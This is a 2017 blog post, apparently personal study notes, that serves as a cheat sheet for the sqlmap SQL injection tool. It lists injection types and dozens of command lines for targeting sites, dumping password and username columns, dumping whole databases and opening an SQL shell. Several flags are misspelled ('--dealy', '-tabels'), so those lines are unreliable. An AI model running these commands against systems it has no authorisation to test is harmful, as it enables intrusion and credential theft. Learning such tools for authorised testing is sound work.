---
layout:		 post
title:		"sqlmap使用指南"
subtitle:	"参考了sqlmap的官方文档和网上的一些教程，手打出一篇"
date:		2017-02-20 23:14:12  +0800
author:		"Les1ie"
categories: jekyll update
---
> First write this article is several months ago, now post it on my blog


## sqlmap
1. `sqlmap -d ` is used to connect from your nachine to the database server's TCP port where the database management system is listening on.

## five different SQL injection types:
> Bollean-based blind
> Time-based blind
> Error-based blind
> Union query-based
> Stacked queries

## several 
1. sqlmap.py -u "url"
2. sqlmap.py -l burp.log
3. sqlmap.py -m 1.txt this is some url write in a text and sqlmap will test
4. sqlmap.py -r post_data.txt the txt file is data of post
5. sqlmap.py -g "inurl:asp?id" this is google dork
6. sqlmap.py -d "mysql//username:password@123.12.23.23:33306/databasename"

## several kind of requests
1. GET sqlmap.py -u "url"
2. POST sqlmap.py -r 1.txt 
3. POST FOR FORM sqlmap -u "url" --forms 
4. POST sqlmap.py -u "url" --data "age=24"
5. COOKIE sqlmap.py -u "url" --cookie "data" --level 2 NOTE:cookie only work when it is level2
6. User-Agent sqlmap -u "url" --user-agent="chrome 55 firefox 50" -v 3
7. Referer sqlmap.py -u "url" --referer "http://tieba.baidu.com" -v 3
8. Dealy sqlmap.py -u "url" --dealy 10
9. Timeout sqlmap.py -u "url" --timeout 10   NOTE:10seconds show timeout, default is 30s
10. Retry sqlmap.py -u "url" ---retries 10
11. Use regex `sqlmap.py -l burp.log -scope="(www)?\.target\.\(com|net|org|cn)"`
12. Avoid too much wrong requests sqlmap.py -u "url" --safe-url "url" get safe url in some time
13. Avoid too much wrong requests sqlmap.py -u "url" --safe-freq "url" get safe url every test
14. Pamera sqlmap.py -u "http://xxxx.com/id*/45" or sqlmap.py -u "url" -p "id"
15. Version of database sqlmap.py -u "url" -b
16. sqlmap.py -u "url" --banner
17. sqlmap.py -u "url" --current-db
18. sqlmap.py -u "url" --current-user
19. sqlmap.py -u "url" --users
20. sqlmap.py -u "url" --dbs
21. sqlmap.py -u "url" -tabels -D "databasename"
22. sqlmap.py -u "url" --columns -T "tablesname" -D "databasename"
23. sqlmap.py -u "url" --tables -D "databasename" --count
24. sqlmap.py -u "url" --dump -C "passwd, username" -T "tablename" -D "databasename"
25. sqlmap.py -u "url" --start 1 --stop 3 -T "tablename" -D "databasename"
26. sqlmap.py -u "url" --first 1 --last 5 
27. Get all the database sqlmap.py -u "url" --dump-all
28. Get all the database sqlmap.py -u "url" --dump-all --exclude-sysdbs Note:only get user database, bot system dbs
29. sqlmap.py -u "url" --sql-shell
30. sqlmap.py -u "url" --sql-query "select * from admin"
31. sqlmap.py -u "url" --search -D test NOTE:to search database name or -T -C
32. sqlmap.py -u "url" --schema NOTE:to show the constract of database
33. sqlmap.py -u "url" --exclude-sysdbs avoid system dbs

